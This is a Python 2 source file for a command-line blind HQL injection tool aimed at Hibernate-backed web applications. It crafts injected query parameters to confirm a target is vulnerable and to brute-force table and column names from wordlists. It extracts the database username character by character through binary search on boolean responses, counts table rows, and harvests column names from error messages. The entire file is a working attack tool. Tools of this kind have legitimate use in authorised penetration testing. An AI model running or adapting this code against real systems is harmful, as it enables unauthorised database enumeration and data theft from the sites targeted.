import urlparse
from bs4 import BeautifulSoup
from math import *
import urllib
import optparse
import requests
import sys
import json
import re

COOKIE = ""
TABLES = {}
USER = ""
VERBOSE_MODE = False

def send_HTTP_request(url, params):
    global COOKIE

    # Create HTTP headers
    headers = {'cookie': COOKIE}

    url = url + '?' + urllib.urlencode(params)
    display_message("URL : " + url)
    req = requests.get(url, headers=headers)
    return req

###########################
### Checker (exists ?) function
###########################    

def column_exists(message):
    if ('not found; SQL statement:' in message):
        return False
    else:
        if ('could not resolve property:' in message):
            return False
        return True

def table_exists(message):
    if ('is not mapped' in message):
        return False
    else:
        return True

def check_if_host_vulnerable(url, params, param_to_test):
    params[param_to_test] = "'"

    req = send_HTTP_request(url, params)
    if ('org.hibernate.QueryException' in req.content):
        print "Host seems vulnerable."
    else:
        raise Exception('No Query Exception in the HTTP response.')

###########################
### Tables
###########################

def find_tables(url, params, param_to_test, file_table):
    global TABLES

    tables_to_test = []
    with open(file_table) as f:
        tables_to_test = f.readlines()

    # removing new line
    for table in tables_to_test:
        table = remove_new_line_from_string(table)
        find_table(url, params, param_to_test, table)

def find_table(url, params, param_to_test, table_name):
    params[param_to_test] = "'and (select count(*) from " + table_name + ") >= 0 or ''='"
    req = send_HTTP_request(url, params)
    if (table_exists(req.content)):
        insert_table_name_in_tables(table_name)
    else:
        print "[-] Table " + table_name + " does not exist."

###########################
### Columns
###########################

def find_columns(url, params, param_to_test, file_column, table_name=None):
    global TABLES

    columns_to_test = []
    with open(file_column) as f:
        columns_to_test = f.readlines()

    if (table_name is None):        
        for table in TABLES:
            for column in columns_to_test:
                # removing new line
                column = remove_new_line_from_string(column)
                find_column(url, params, param_to_test, table, column)
    else:
        for column in columns_to_test:
            # removing new line
            column = remove_new_line_from_string(column)
            find_column(url, params, param_to_test, table_name, column)

def find_column(url, params, param_to_test, table, column_name):
    global TABLES

    if (table not in TABLES):
        find_table(url, params, param_to_test, table)
        if (table not in TABLES):
            raise Exception('Table ' + table + ' does not exist ?')

    params[param_to_test] = "'and (select count(w." + column_name + ") from " + table + " w) >= 0 or ''='"
    
    req = send_HTTP_request(url, params)
    if (column_exists(req.content)):
        insert_column_in_table(table, column_name)
    else:
        print "[-] Column " + column_name + " in " + table + " does not exist." 

###########################
### Username
###########################

def get_dbms_username(url, params, param, message):
    global TABLES
    global USER

    try:
        table_to_test = TABLES.items()[0][0]
    except:
        raise Exception('No tables found ?')    
    
    display_message("Using " + table_to_test + " to retrieve user()")

    # get the count of the table
    request = "' and (SELECT count(*) FROM " + table_to_test + ") "
    count_table = retrieve_count_or_length(url, params, param, message, request)

    # get the length of the username
    request = "' and (SELECT length(CONCAT(COUNT(*), '/', USER())) FROM " + table_to_test + ") "
    count_user = retrieve_count_or_length(url, params, param, message, request)

    length_user = int(count_user) - int(count_table)
    display_message("Count of table  " + table_to_test + ": " + count_table)
    display_message("Length of user() : " + str(length_user))

    i = len(str(count_table)) + 2
    username_str = ""
    while (i <= int(count_user)):
        request = "' and (SELECT substring(CONCAT(COUNT(*), '/', USER()), " + str(i) + ", 1) FROM " + table_to_test + ") "
        char = int(retrieve_count_or_length(url, params, param, message, request, True))
        username_str = username_str + chr(char)
        i = i + 1

    USER = username_str
    print "[!] Username of Database found : " + USER

###########################
### Count functions
###########################

def get_count_of_tables(url, params, param, message):
    global TABLES

    for table in TABLES:
        get_count_of_table(url, params, param, message, table)

def get_count_of_table(url, params, param_to_test, message, name_table):

    request = "' and (SELECT count(*) FROM " + name_table + ") "
    count = retrieve_count_or_length(url, params, param_to_test, message, request)

    print "[!] Count(*) of " + name_table + " : " + str(count)


def retrieve_count_or_length(url, params, param_to_test, message, request, isChar=False):
    inf = 0
    sup = 10

    while (inf != sup):
        inf_str = '{:g}'.format(inf)
        sup_str = '{:g}'.format(sup)

        if (isChar):
            params[param_to_test] = request + " = CHAR(" + inf_str + ") or ''='"    
        else:
            params[param_to_test] = request + " = " + inf_str + " or ''='"    
        
        req = send_HTTP_request(url, params)
        if (message in req.content):
            break
    
        if (isChar):
            params[param_to_test] = request + " >= CHAR(" + sup_str + ") or ''='"
        else:
            params[param_to_test] = request + " >= " + sup_str + " or ''='"

        req = send_HTTP_request(url, params)
        if (message in req.content):
            inf = sup
            sup = (2 * inf)
        else:
            sup = sup - floor((sup-inf)/2)

    return '{:g}'.format(inf)

###########################
### Insert table/Column utils
###########################

def insert_table_name_in_tables(table_name):
    global TABLES

    #First letter in uppercase
    table_name = table_name.title()
    if (table_name not in TABLES):
        print "[!] Table " + table_name + " has been found."
        TABLES[table_name] = []
    else:
        display_message("[-] Table " + table_name + " has been found (again).")

def insert_column_in_table(table_name, column_name):
    global TABLES

    #First letter in uppercase
    table_name = table_name.title()
    column_name = column_name.title()
    
    if (table_name not in TABLES):
        raise Exception('This might be a problem with ' + table_name)

    if (column_name not in TABLES[table_name]):
        TABLES[table_name].append(column_name)
        print "[!] Column " + column_name + " has been found in table " + table_name
    else:
        display_message("[-] Column " + column_name + " has been found in table " + table_name + " (again)")

###########################
### Results functions
###########################

def list_columns(url, params, param_to_test):

    global TABLES
    columns = []
    params[param_to_test] = "' and test=1 and ''='"

    req = send_HTTP_request(url, params)
    if ('not found; SQL statement' in req.content):
        # pattern for the columns
        pattern = re.compile(r'(([a-zA-Z_-]+)[0-9]+_\.([a-zA-Z0-9_-]+)\s)')
        for res in re.findall(pattern, req.content):
            table_name = res[1]
            column_name = res[2]

            insert_table_name_in_tables(table_name)
            insert_column_in_table(table_name, column_name)
    else:
        raise Exception('We cannot manage to retrieve columns.')

def enumerate_tables_and_columns():
    global TABLES

    display_message("[-] Enumerating extracted information")
    for table in TABLES:
        print "[" + table + "]"
        for column in TABLES[table]:
            print "\t" + column

def remove_new_line_from_string(string, char=''):
    return string[:-1] + char

def display_message(message):
    global VERBOSE_MODE
    if (VERBOSE_MODE):
        print message

# option parser
parser = optparse.OptionParser()
parser.add_option('--url', help='qURL to pentest', dest='url')
parser.add_option('--cookie', help='Cookie to test it', dest='cookie', default=None)
parser.add_option('--param', help='Param to test', dest='param')
parser.add_option('--message', help='Message appearing while Blind HQLi', dest='blind_hqli_message', default=None)

# Table options
parser.add_option('--tables', help='Tries to gather as much tables as possible (With Bruteforce)', dest='tables', default=False, action='store_true')
parser.add_option('--T', help='Name of the table you want to get', dest='table', default=None)
parser.add_option('--table_name_file', help='DB file for name of tables', dest='file_table', default='db/tables.db')

# Column options
parser.add_option('--columns', help='Tries to gather as much columns as possible (With Bruteforce)', dest='columns', default=False, action='store_true')
parser.add_option('--C', help='Name of the column you want to get', dest='column', default=None)
parser.add_option('--column_name_file', help='DB file for name of columns', dest='file_column', default='db/columns.db')

# Fingerprinting flag
parser.add_option('--check', help='Check if host is vulnerable', dest='check', default=False, action='store_true')
parser.add_option('--user', help='Tries to get user() from dbms', dest='user', default=False, action='store_true')
parser.add_option('--count', help='Get count of specified table(s)', dest='count', default=False, action='store_true')

# Results options
parser.add_option('--results', help='Enumerate results after session', dest='results', default=False, action='store_true')
parser.add_option('--verbose', help='Verbose mode', dest='verbose', default=False, action='store_true')

if (len(sys.argv) <= 2):
    parser.print_help()
else:
    (opts, args) = parser.parse_args()
    # Setting cookie and verbose mode
    COOKIE = opts.cookie
    VERBOSE_MODE = opts.verbose

    # check for param
    params = opts.url.split('?')[1]
    params = dict( (k, v if len(v)>1 else v[0] ) 
           for k, v in urlparse.parse_qs(params).iteritems() )

    if (opts.param not in params):
        raise Exception('Param not in URL!')

    url = opts.url.split('?')[0]

    # --check flag
    if (opts.check):
        check_if_host_vulnerable(url, params, opts.param)

    # --tables flag
    if (opts.tables):
        display_message("Trying to gather as much tables..")
        find_tables(url, params, opts.param, opts.file_table)

    # -T=<name> flag
    if (opts.table):
        display_message("Checking if " + opts.table + " exists.") 
        find_table(url, params, opts.param, opts.table)

    # --columns flag
    if (opts.columns):
        if (opts.tables):
            display_message("Trying to find columns for all tables")
            find_columns(url, params, opts.param, opts.file_column)
        elif(opts.table is not None):
            display_message("Trying to find columns for table " + opts.table)
            find_columns(url, params, opts.param, opts.file_column, opts.table)
        else:
            print "ERROR : No table flag specified. "

    # -C=<name> flag
    if (opts.column):
        if (opts.tables):
            display_message("Trying to find column " + opts.column + " for all tables")
            for table in TABLES:
                find_column(url, params, opts.param, table, opts.column)
        elif(opts.table is not None):
            display_message("Trying to find column " + opts.column + " for table " + opts.table)
            find_column(url, params, opts.param, opts.table, opts.column)
        else:
            print "ERROR : No table flag specified. "

    # --user flag
    if (opts.user):
        get_dbms_username(url, params, opts.param, opts.blind_hqli_message)

    # --count flag
    if (opts.count):
        if (opts.tables):
            get_count_of_table(url, params, opts.param, opts.blind_hqli_message)
        elif(opts.table is not None):
            get_count_of_table(url, params, opts.param, opts.blind_hqli_message, opts.table)
        else:
            print "ERROR : No table flag specified. "

    # enumerate tables and columns found if flag passed
    if (opts.results):
        # list columns
        list_columns(url, params, opts.param)
        enumerate_tables_and_columns()